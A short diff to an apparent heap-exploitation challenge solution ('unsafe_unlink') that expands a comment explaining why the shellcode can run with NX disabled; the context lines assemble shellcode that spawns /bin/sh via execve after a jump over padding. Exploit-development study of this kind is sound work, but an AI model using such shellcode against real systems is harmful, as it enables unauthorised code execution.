@@ -70,7 +70,8 @@ def solve():
     """
     Assemble shellcode. We use a label and a jmp instruction because our
     shellcode will be mangled when malloc writes an address into the fd of our
-    fake chunk.
+    fake chunk. We're able to execute this shellcode because the NX memory
+    protection is not enabled for "unsafe_unlink".
     """
     shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" +
                     shellcraft.execve("/bin/sh"))
